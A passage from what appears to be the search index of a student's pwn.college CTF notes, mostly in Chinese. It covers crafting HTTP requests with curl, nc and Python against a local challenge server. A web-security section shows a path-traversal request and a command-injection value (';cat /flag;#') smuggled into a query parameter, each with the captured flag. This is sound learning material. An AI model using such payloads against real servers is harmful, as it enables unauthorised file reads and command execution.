bfdb9003&a42c27d5#f291d8c2\"]}}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc -q 0 127.0.0.1 80 level30 Include complex json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"04c2b7fc38f2a2057ab89b310a7d8311\", \"b\":{ 'c': '5ff12d56', 'd': ['93ca0c53', '9b346607 fa6d6f12&c772efa3#fddc4350'] } } json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text) level31 Follow an HTTP redirect from HTTP response using curl curl -L http://127.0.0.1 level32 Follow an HTTP redirect from HTTP response using nc printf 'GET /fd33eca3350f203a7cc09fa116eaa060 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 10 -q 0 127.0.0.1 80 level33 Follow an HTTP redirect from HTTP response using python import requests url = 'http://127.0.0.1' response = requests.get(url, allow_redirects=True) new_response = requests.get(response.url) print(new_response.text) level34 Include a cookie from HTTP response using curl curl -b \"cookie=d2b2eb6ac86abb563027659450780a51\" -L -v http://127.0.0.1 level35 Include a cookie from HTTP response using nc printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: cookie=c1c5e422a53c2b73d080674d417d06fd\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 level36 Include a cookie from HTTP response using python \u8c8c\u4f3c\u9898\u6709\u70b9\u513f\u6bdb\u75c5\u554a\u3002\u3002\u3002 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text) level37 Include a cookie from HTTP response using curl curl -c cookies.txt http://127.0.0.1 curl -b cookies.txt -L -v http://127.0.0.1 level38 Include a cookie from HTTP response using nc \u597d\u5427\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u5c31\u662f\u91cd\u590d\u8fd0\u884c\u51e0\u904d\uff0c\u5c31\u884c\u4e86\uff0c\u5e94\u8be5\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 \u6211TM\u624b\u52a8\u8f93\u4e86\u597d\u51e0\u904d\uff0c\u6211\u65e5\u3002\u3002\u3002 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6MX0.ZLMdXw.VU5O3fTNhAgzX_0GG5B3kRNVZ0M\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6Mn0.ZLMdcQ.Ip32pWs2LPaq23ckcO5TQSjN5Us\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6M30.ZLMdjQ.3QXprUl27h0da-RC0xjx1ZwrLZ0\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 level39 Include a cookie from HTTP response using python \u8c8c\u4f3c\u786e\u5b9e\u6709\u6bdb\u75c5\u4e86 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text) \u788e\u788e\u5ff5\uff0c\u8fd9\u4e2anc\u662f\u771f\u7684\u96be\u7528\uff0c\u8fd8\u662fpython\u597d\u7528","title":"talking-web"},{"location":"CSE365/talking-web/#knoeledge","text":"\u91cd\u70b9\u662fhttp \u8bf7\u6c42\u62a5\u6587\uff0c\u8fd9\u90e8\u5206\u4e0d\u592a\u6d89\u53ca\u54cd\u5e94\u62a5\u6587 \u4e00\u4e2a http \u8bf7\u6c42\u62a5\u6587\u7531\u56db\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a \u8bf7\u6c42\u884c\uff08Request-Line\uff09 \u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09 \u56de\u8f66\u6362\u884c\uff08CRLF\uff09 \u6d88\u606f\u4f53\uff08Message Body\uff09","title":"knoeledge"},{"location":"CSE365/talking-web/#request-line","text":"\u6211\u4eec\u6765\u770b\u4e00\u5f00\u59cb\u7ed9\u7684\u793a\u4f8b\u7684\u8bf7\u6c42\u884c POST / HTTP/1.1 \u8bf7\u6c42\u884c\u5206\u4e3a\u4e86\u4e09\u4e2a\u90e8\u5206\uff1a \u8bf7\u6c42\u65b9\u6cd5\uff08Method\uff09 \u8bf7\u6c42 URI HTTP \u534f\u8bae\u7248\u672c \u4e09\u8005\u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u9694\u3002","title":"\u8bf7\u6c42\u884c\uff08Request-Line\uff09"},{"location":"CSE365/talking-web/#_1","text":"GET\uff1a\u83b7\u53d6\u8d44\u6e90 POST\uff1a\u4f20\u8f93\u5b9e\u4f53\u4e3b\u4f53 PUT\uff1a\u4f20\u8f93\u6587\u4ef6 HEAD\uff1a\u83b7\u5f97\u62a5\u6587\u9996\u90e8\uff08\u76f8\u5f53\u4e8eGET\u65b9\u6cd5\u83b7\u5f97\u7684\u8d44\u6e90\u53bb\u6389\u6b63\u6587\uff09 DELETE\uff1a\u5220\u9664\u6587\u4ef6 OPTIONS\uff1a\u8be2\u95ee\u652f\u6301\u7684\u65b9\u6cd5\uff08\u5ba2\u6237\u7aef\u95ee\u670d\u52a1\u5668\uff09 TRACE\uff1a\u8ffd\u8e2a\u8def\u5f84 OCONNECT\uff1a\u8981\u6c42\u7528\u96a7\u9053\u534f\u8bae\u8fde\u63a5\u4ee3\u7406 LINK\uff1a\u5efa\u7acb\u4e0e\u8d44\u6e90\u4e4b\u95f4\u7684\u8054\u7cfb UNLINE\uff1a\u65ad\u5f00\u8fde\u63a5\u5173\u7cfb","title":"\u8bf7\u6c42\u65b9\u6cd5"},{"location":"CSE365/talking-web/#request-header-fields","text":"\u8fd9\u90e8\u5206\u7531\u6210\u5bf9\u7684\u8bf7\u6c42\u5934\u90e8\u7ec4\u6210\uff0c\u7528\u6765\u544a\u77e5\u670d\u52a1\u7aef\u8bf7\u6c42\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u8fd9\u662f\u672a\u6765\u7684\u91cd\u4e2d\u4e4b\u91cd\uff01\u52a1\u5fc5\u638c\u63e1\uff01 - Host \uff1a\u8bf7\u6c42\u7684\u8d44\u6e90\u5728\u54ea\u4e2a\u4e3b\u673a\u7684\u7aef\u53e3\u4e0a - Connection\uff1a\u8be5\u8bf7\u6c42\u652f\u6301\u957f\u8fde\u63a5\uff08heep_alive\uff09 - Content-Length\uff1a\u6b63\u6587\u5185\u5bb9\u957f\u5ea6 - Content-Type\uff1a\u6570\u636e\u7c7b\u578b - User-Agent\uff1a\u58f0\u660e\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u6d4f\u89c8\u5668\u7248\u672c\u4fe1\u606f - Accent\uff1a\u53d1\u8d77\u4e86\u8bf7\u6c42 - Referer\uff1a\u5f53\u524d\u9875\u9762\u662f\u4ece\u54ea\u4e2a\u9875\u9762\u8df3\u8f6c\u8fc7\u6765\u7684 - Accept-Encoding\uff1a\u63a5\u53d7\u7684\u7f16\u7801 - Accept-Language\uff1a\u63a5\u53d7\u7684\u8bed\u8a00\u7c7b\u578b - Cookie\uff1a\u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u5c11\u91cf\u4fe1\u606f\uff0c\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u4f1a\u8bdd\uff08session\uff09\u529f\u80fd","title":"\u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09"},{"location":"CSE365/talking-web/#message-body","text":"\u8fd9\u90e8\u5206\u643a\u5e26\u4e86\u672c\u6b21\u8bf7\u6c42\u9700\u8981\u53d1\u5f80\u670d\u52a1\u7aef\u7684\u4fe1\u606f\uff0c\u6709\u7684 Method \u6709\u8fd9\u90e8\u5206\uff0c\u800c\u6709\u7684 Method \u4e0d\u9700\u8981\u8fd9\u90e8\u5206\u3002 \u6bd4\u5982 get \u65b9\u6cd5\u5c31\u6ca1\u6709\u6d88\u606f\u4f53\uff0cget \u65b9\u6cd5\u4e00\u822c\u90fd\u662f\u901a\u8fc7 query \u6765\u4f20\u9012\u53c2\u6570\u3002 \u800c post \u65b9\u6cd5\u4e00\u822c\u5c31\u6709\u6d88\u606f\u4f53\u3002","title":"\u6d88\u606f\u4f53\uff08Message Body\uff09"},{"location":"CSE365/talking-web/#_2","text":"","title":"\u8bf7\u6c42\u5934\u90e8\u5177\u4f53\u4fe1\u606f"},{"location":"CSE365/talking-web/#ref","text":"https://zhuanlan.zhihu.com/p/112060856 https://blog.csdn.net/qq_40933663/article/details/90045869","title":"ref"},{"location":"CSE365/talking-web/#useful-cmd","text":"/challenge/run Output: hacker@talking-web-level-12:~$ /challenge/run * Serving Flask app 'run' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:80 Press CTRL+C to quit \u884c\u5427\uff0c\u8fd9\u4e00\u5927\u5806\u6311\u6218\uff0c\u5012\u662f\u8ba9\u6211\u628acurl nc\u8fd9\u4fe9\u73a9\u610f\u513f\u73a9\u513f\u719f\u4e86\u3002\u3002\u3002","title":"Useful cmd"},{"location":"CSE365/talking-web/#level1","text":"Send an HTTP request using curl curl http://127.0.0.1:80","title":"level1"},{"location":"CSE365/talking-web/#level2","text":"Send an HTTP request using nc printf \"GET / HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level2"},{"location":"CSE365/talking-web/#ref_1","text":"a blog","title":"ref"},{"location":"CSE365/talking-web/#level3","text":"Send an HTTP request using python import requests response = requests.get('http://127.0.0.1:80') print(response.content)","title":"level3"},{"location":"CSE365/talking-web/#level4","text":"Set the host header in an HTTP request using curl curl -H 'Host: f04e757423e4172f7391a2c52dd6d52b' http://127.0.0.1:80","title":"level4"},{"location":"CSE365/talking-web/#level5","text":"Set the host header in an HTTP request using nc echo -e \"GET / HTTP/1.1\\r\\nHost: e87665191d938ed557e6d75bed2a59e7\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level5"},{"location":"CSE365/talking-web/#level6","text":"Set the host header in an HTTP request using python import requests url = 'http://127.0.0.1:80' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text)","title":"level6"},{"location":"CSE365/talking-web/#level7","text":"Set the path in an HTTP request using curl curl http://127.0.0.1:80/32edfeba32e2616897b6a4907182e609","title":"level7"},{"location":"CSE365/talking-web/#level8","text":"Set the path in an HTTP request using nc printf \"GET /a2ef4bee2f651380996e3e91ec9ae47b HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level8"},{"location":"CSE365/talking-web/#level9","text":"Set the path in an HTTP request using python import requests url = 'http://127.0.0.1:80/563d4434a61e9b4f8aad9f89476f9d56' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text)","title":"level9"},{"location":"CSE365/talking-web/#level10","text":"URL encode a path in an HTTP request using curl curl --request GET --url 'http://127.0.0.1/5db90f90%20c57f0931/898c7a05%207a6a6c70'","title":"level10"},{"location":"CSE365/talking-web/#level11","text":"URL encode a path in an HTTP request using nc echo -ne \"GET /c84632a0%203d7cd667/cc68c4e5%205289cce4 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level11"},{"location":"CSE365/talking-web/#level12","text":"URL encode a path in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) path = '/24f18995%2035ce2423/0dc75e53%20a62355c0' conn.request(\"GET\", path) response = conn.getresponse() print(response.read().decode())","title":"level12"},{"location":"CSE365/talking-web/#level13","text":"Specify an argument in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=d12e875e302a313b93e311080177c69e\"","title":"level13"},{"location":"CSE365/talking-web/#level14","text":"Specify an argument in an HTTP request using nc echo -ne \"GET /?a=2469a7322bdff77e7cf50f7a397ecf1e HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level14"},{"location":"CSE365/talking-web/#level15","text":"Specify an argument in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) params = 'a=70206814776ee99485d36f75416cc53e' conn.request(\"GET\", \"/?\" + params) response = conn.getresponse() print(response.read().decode()) or import requests url = 'http://127.0.0.1/?a=2469a7322bdff77e7cf50f7a397ecf1e' response = requests.get(url) print(response.text)","title":"level15"},{"location":"CSE365/talking-web/#level16","text":"Specify multiple arguments in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=ecd147484bddde7d37b1911de43a8879&b=40d9af5c%20d0b5b669%266fea1792%23e808fb58\"","title":"level16"},{"location":"CSE365/talking-web/#level17","text":"Specify multiple arguments in an HTTP request using nc echo -ne \"GET /?a=5d723fd68383a9c49eb60b0633069601&b=164073f7%207871c6b5%26b94dd88d%23977ae717 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level17"},{"location":"CSE365/talking-web/#level18","text":"Specify multiple arguments in an HTTP request using python import requests url = 'http://127.0.0.1/?a=4ce9272291b7199073124105d91e05b8&b=56eb0b42%204ae6359b%26f16e873e%2313ac55ab' response = requests.get(url) print(response.text)","title":"level18"},{"location":"CSE365/talking-web/#level19","text":"Include form data in an HTTP request using curl curl -X POST -d \"a=aa62a14fe954e109fd0afd6a6b81ae87&b=123\" \"http://127.0.0.1/\"","title":"level19"},{"location":"CSE365/talking-web/#level20","text":"Include form data in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 64\\r\\n\\r\\na=0f4e8daf3fc9d8aa6a59af8b111cd9b6\" | nc 127.0.0.1 80","title":"level20"},{"location":"CSE365/talking-web/#level21","text":"Include form data in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': '728301dd59f5157a45b164530cd4bd9a'} response = requests.post(url, data=data) print(response.text)","title":"level21"},{"location":"CSE365/talking-web/#level22","text":"Include form data with multiple fields in an HTTP request using curl curl -X POST -d \"a=6d2e619d8691e29c605eacecff1d17f5&b=40f3c192%204a42b9c8%26042940eb%23ce8b5cc9\" \"http://127.0.0.1/\"","title":"level22"},{"location":"CSE365/talking-web/#level23","text":"Include form data with multiple fields in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 78\\r\\n\\r\\na=7bd29b83c57c2e3a0c9f0387fabea724&b=20c245cf%2075d26cf5%26100f8c42%23d1702767\" | nc 127.0.0.1 80","title":"level23"},{"location":"CSE365/talking-web/#level24","text":"Include form data with multiple fields in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': 'db865b3bfd0d2e5ffa0c112dc700ddb9','b':'d7d3ad1a edee631b&eba293d5#d6e4cf79'} response = requests.post(url, data=data) print(response.text)","title":"level24"},{"location":"CSE365/talking-web/#level25","text":"Include json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"e1d94af35f929e364d037ca78f5dbfa0\"}' http://127.0.0.1/","title":"level25"},{"location":"CSE365/talking-web/#level26","text":"Include json data in an HTTP request using nc data='{\"a\": \"95a77ed287428e0fbc550158d061c07c\"}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc 127.0.0.1 80","title":"level26"},{"location":"CSE365/talking-web/#level27","text":"Include json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"98f37a6b119aec9d10b6a7de1934c9ca\"} json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text)","title":"level27"},{"location":"CSE365/talking-web/#level28","text":"Include complex json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"39a0e409bba714d0ffe73ce038cb7b3a\", \"b\": {\"c\": \"930862ea\", \"d\": [\"c6a605f0\", \"c7ad7398 3fbbb9dc&458f3441#25f76ea0\"]}}' http://127.0.0.1/","title":"level28"},{"location":"CSE365/talking-web/#level29","text":"Include complex json data in an HTTP request using nc data='{\"a\": \"b7ae4afbfd6f78ad7ab06f1203ece1be\",\"b\":{\"c\": \"0ce40827\", \"d\": [\"fb1739d2\", \"5cde3361 bfdb9003&a42c27d5#f291d8c2\"]}}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc -q 0 127.0.0.1 80","title":"level29"},{"location":"CSE365/talking-web/#level30","text":"Include complex json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"04c2b7fc38f2a2057ab89b310a7d8311\", \"b\":{ 'c': '5ff12d56', 'd': ['93ca0c53', '9b346607 fa6d6f12&c772efa3#fddc4350'] } } json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text)","title":"level30"},{"location":"CSE365/talking-web/#level31","text":"Follow an HTTP redirect from HTTP response using curl curl -L http://127.0.0.1","title":"level31"},{"location":"CSE365/talking-web/#level32","text":"Follow an HTTP redirect from HTTP response using nc printf 'GET /fd33eca3350f203a7cc09fa116eaa060 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 10 -q 0 127.0.0.1 80","title":"level32"},{"location":"CSE365/talking-web/#level33","text":"Follow an HTTP redirect from HTTP response using python import requests url = 'http://127.0.0.1' response = requests.get(url, allow_redirects=True) new_response = requests.get(response.url) print(new_response.text)","title":"level33"},{"location":"CSE365/talking-web/#level34","text":"Include a cookie from HTTP response using curl curl -b \"cookie=d2b2eb6ac86abb563027659450780a51\" -L -v http://127.0.0.1","title":"level34"},{"location":"CSE365/talking-web/#level35","text":"Include a cookie from HTTP response using nc printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: cookie=c1c5e422a53c2b73d080674d417d06fd\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80","title":"level35"},{"location":"CSE365/talking-web/#level36","text":"Include a cookie from HTTP response using python \u8c8c\u4f3c\u9898\u6709\u70b9\u513f\u6bdb\u75c5\u554a\u3002\u3002\u3002 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text)","title":"level36"},{"location":"CSE365/talking-web/#level37","text":"Include a cookie from HTTP response using curl curl -c cookies.txt http://127.0.0.1 curl -b cookies.txt -L -v http://127.0.0.1","title":"level37"},{"location":"CSE365/talking-web/#level38","text":"Include a cookie from HTTP response using nc \u597d\u5427\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u5c31\u662f\u91cd\u590d\u8fd0\u884c\u51e0\u904d\uff0c\u5c31\u884c\u4e86\uff0c\u5e94\u8be5\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 \u6211TM\u624b\u52a8\u8f93\u4e86\u597d\u51e0\u904d\uff0c\u6211\u65e5\u3002\u3002\u3002 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6MX0.ZLMdXw.VU5O3fTNhAgzX_0GG5B3kRNVZ0M\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6Mn0.ZLMdcQ.Ip32pWs2LPaq23ckcO5TQSjN5Us\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6M30.ZLMdjQ.3QXprUl27h0da-RC0xjx1ZwrLZ0\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80","title":"level38"},{"location":"CSE365/talking-web/#level39","text":"Include a cookie from HTTP response using python \u8c8c\u4f3c\u786e\u5b9e\u6709\u6bdb\u75c5\u4e86 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text) \u788e\u788e\u5ff5\uff0c\u8fd9\u4e2anc\u662f\u771f\u7684\u96be\u7528\uff0c\u8fd8\u662fpython\u597d\u7528","title":"level39"},{"location":"CSE365/websecurity/","text":"Knoeledge \u9700\u8981\u77e5\u9053web\u670d\u52a1\u5668\u90fd\u80fd\u5e72\u4ec0\u4e48\u4e8b SQL\uff0c\u5927\u540d\u9f0e\u9f0e\u7684SQL\u6ce8\u5165 \u547d\u4ee4\u6ce8\u5165 HTML\uff0c\u4e5f\u5c31\u662f\u6ce8\u5165\u90e8\u5206JavaScript C\u8bed\u8a00\u7684\u5806\u6808\u6ce8\u5165 \u603b\u7684\u6765\u8bf4\u5c31\u662f\u5229\u7528Web\u670d\u52a1\u5668\u4f1a\u6267\u884c\u4e00\u4e9b\u8bed\u53e5\uff08\u90e8\u5206\u53c2\u6570\u6765\u81ea\u4e8e\u6211\u4eec\u7684\u8f93\u5165\uff09\uff0c\u6765\u8fdb\u884c\u64cd\u4f5c\u3002 Origin\u7684\u6982\u5ff5\uff1a( , , ) \uff08http, exapmle.com,80\uff09 HTML-embeds\u3001\u57df\u540d\u3001\u7ad9\u70b9\u7b49\u6982\u5ff5\uff0c\u57fa\u672c\u4e0a\u90fd\u662f\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u5185\u5bb9 WP level1 Exploit a path traversal vulnerability \u8fd9\u4e2a\u5176\u5b9e\u6211\u627e\u4e0d\u5230\u592a\u597d\u7684\u65b9\u6cd5\uff0c\u53ea\u80fd\u731c\uff0c\u731c\u5230\u4e86\u5c31\u662f\u4e86 hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag pwn.college{4MSrtxHJYUF2_wAz81iNV6UtM5K.ddDOzMDL2QjMyMzW} hacker@web-security-level-1:~$ level2 Exploit a command injection vulnerability \u8fd9\u4e2a\u5341\u5206\u7b80\u5355\uff0c\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u53ea\u9700\u8981\u8ba9\u524d\u9762\u7684\u547d\u4ee4\u95ed\u5408\u5373\u53ef hacker@web-security-level-2:~$ curl \"http://challenge.localhost:80/?timezone=;cat%20/flag;#\" pwn.college{o0h_efJ2CAv60AmeSOoPYGrZKBs.dhDOzMDL2QjMyMzW} Mon Jul 24 07:17:20 UTC 2023 level3 Exploit an authentication bypass vulnerability level4 Exploit a structured query language injection vulnerability to login level5 Exploit a structured query language injection vulnerability to leak data level6 Exploit a structured query language injection vulnerability with an unknown database structure level7 Exploit a structured query language injection vulnerability to blindly leak data level8 Exploit a cross site scripting vulnerability level9 Exploit a cross site scripting vulnerability with more complicated context level10 Exploit a cross site scripting vulnerability to cause a user action level11 Exploit a cross site request forgery vulnerability level12 Exploit a cross site request forgery vulnerability where the request must POST level13 Exploit a cross site scripting vulnerability to exfilitrate user session data level14 Exploit a cross site scripting vulnerability to exfilitrate user data level15 Exploit a (memory corruption) stack injection vulnerability","title":"websecurity"},{"location":"CSE365/websecurity/#knoeledge","text":"\u9700\u8981\u77e5\u9053web\u670d\u52a1\u5668\u90fd\u80fd\u5e72\u4ec0\u4e48\u4e8b SQL\uff0c\u5927\u540d\u9f0e\u9f0e\u7684SQL\u6ce8\u5165 \u547d\u4ee4\u6ce8\u5165 HTML\uff0c\u4e5f\u5c31\u662f\u6ce8\u5165\u90e8\u5206JavaScript C\u8bed\u8a00\u7684\u5806\u6808\u6ce8\u5165 \u603b\u7684\u6765\u8bf4\u5c31\u662f\u5229\u7528Web\u670d\u52a1\u5668\u4f1a\u6267\u884c\u4e00\u4e9b\u8bed\u53e5\uff08\u90e8\u5206\u53c2\u6570\u6765\u81ea\u4e8e\u6211\u4eec\u7684\u8f93\u5165\uff09\uff0c\u6765\u8fdb\u884c\u64cd\u4f5c\u3002 Origin\u7684\u6982\u5ff5\uff1a( , , ) \uff08http, exapmle.com,80\uff09 HTML-embeds\u3001\u57df\u540d\u3001\u7ad9\u70b9\u7b49\u6982\u5ff5\uff0c\u57fa\u672c\u4e0a\u90fd\u662f\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u5185\u5bb9","title":"Knoeledge"},{"location":"CSE365/websecurity/#wp","text":"","title":"WP"},{"location":"CSE365/websecurity/#level1-exploit-a-path-traversal-vulnerability","text":"\u8fd9\u4e2a\u5176\u5b9e\u6211\u627e\u4e0d\u5230\u592a\u597d\u7684\u65b9\u6cd5\uff0c\u53ea\u80fd\u731c\uff0c\u731c\u5230\u4e86\u5c31\u662f\u4e86 hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag pwn.college{4MSrtxHJYUF2_wAz81iNV6UtM5K.ddDOzMDL2QjMyMzW} hacker@web-security-level-1:~$","title":"level1 Exploit a path traversal vulnerability"},{"location":"CSE365/websecurity/#level2-exploit-a-command-injection-vulnerability","text":"\u8fd9\u4e2a\u5341\u5206\u7b80\u5355\uff0c\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u53ea\u9700\u8981\u8ba9\u524d\u9762\u7684\u547d\u4ee4\u95ed\u5408\u5373\u53ef hacker@web-security-level-2:~$ curl \"http://challenge.localhost:80/?timezone=;cat%20/flag;#\" pwn.college{o0h_efJ2CAv60AmeSOoPYGrZKBs.dhDOzMDL2QjMyMzW} Mon Jul 24 07:17:20 UTC 2023","title":"level2 Exploit a command injection vulnerability"},{"location":"CSE365/websecurity/#level3-exploit-an-authentication-bypass-vulnerability","text":"","title":"level3 Exploit an authentication bypass vulnerability"},{"location":"CSE365/websecurity/#level4-exploit-a-structured-query-language-injection-vulnerability-to-login","text":"","title":"level4 Exploit a structured query language injection vulnerability to login"},{"location":"CSE365/websecurity/#level5-exploit-a-structured-query-language-injection-vulnerability-to-leak-data","text":"","title":"level5 Exploit a structured query language injection vulnerability to leak data"},{"location":"CSE365/websecurity/#level6-exploit-a-structured-query-language-injection-vulnerability-with-an-unknown-database-structure","text":"","title":"level6 Exploit a structured query language injection vulnerability with an unknown database structure"},{"location":"CSE365/websecurity/#level7-exploit-a-structured-query-language-injection-vulnerability-to-blindly-leak-data","text":"","title":"level7 Exploit a structured query language injection vulnerability to blindly leak data"},{"location":"CSE365/websecurity/#level8-exploit-a-cross-site-scripting-vulnerability","text":"","title":"level8 Exploit a cross site scripting vulnerability"},{"location":"CSE365/websecurity/#level9-exploit-a-cross-site-scripting-vulnerability-with-more-complicated-context","text":"","title":"level9 Exploit a cross site scripting vulnerability with more complicated context"},{"location":"CSE365/websecurity/#level10-exploit-a-cross-site-scripting-vulnerability-to-cause-a-user-action","text":"","title":"level10 Exploit a cross site scripting vulnerability to cause a user action"},{"location":"CSE365/websecurity/#level11-exploit-a-cross-site-request-forgery-vulnerability","text":"","title":"level11 Exploit a cross site request forgery vulnerability"},{"location":"CSE365/websecurity/#level12-exploit-a-cross-site-request-forgery-vulnerability-where-the-request-must-post","text":"","title":"level12 Exploit a cross site request forgery vulnerability where the request must POST"},{"location":"CSE365/websecurity/#level13-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-session-data","text":"","title":"level13 Exploit a cross site scripting vulnerability to exfilitrate user session data"},{"location":"CSE365/websecurity/#level14-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-data","text":"","title":"level14 Exploit a cross site scripting vulnerability to exfilitrate user data"},{"location":"CSE365/websecurity/#level15-exploit-a-memory-corruption-stack-injection-vulnerability","text":"","title":"level15 Exploit a (memory corruption) stack injection vulnerability"},{"location":"CSE466/","text":"CSE466 fall22 \u6a21\u5757\u603b\u7ed3 program misuse \u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u57fa\u7840\uff0c\u5927\u90e8\u5206\u662f\u8ba9\u4f60\u8ba4\u8bc6linux\u4e0b\u7684\u5404\u79cd\u5de5\u5177\u3002\u5bf9\u65b0\u4eba\uff08\u6307\u81f3\u5c11\u719f\u6089\u5176\u4e2d\u90e8\u5206\u5de5\u5177\u4f46\u6ca1\u63a5\u89e6\u8fc7CTF\u7684\u4eba\uff09\u6765\u8bf4\u5e94\u8be5\u542f\u53d1\u5f88\u5927\uff0c\u5f88\u591a\u5de5\u5177\u867d\u7136\u8bbe\u8ba1\u51fa\u6765\u5e76\u4e0d\u662f\u4e3a\u4e86\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u652f\u6301\u8c03\u8bd5\u3001\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3001\u751a\u81f3\u662f\u8c03\u7528\u5176\u4ed6\u7a0b\u5e8f\u7b49\u79cd\u79cd\u8fd0\u884c\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u65b9\u6cd5\u5f97\u5230\u6587\u4ef6\u5185\u5bb9\u3002\u5176\u5b9e\u6211\u8ba4\u4e3a\u8fd9\u662f\u8ba9\u4f60\u5173\u6ce8\u90a3\u4e9b\u5de5\u5177\u4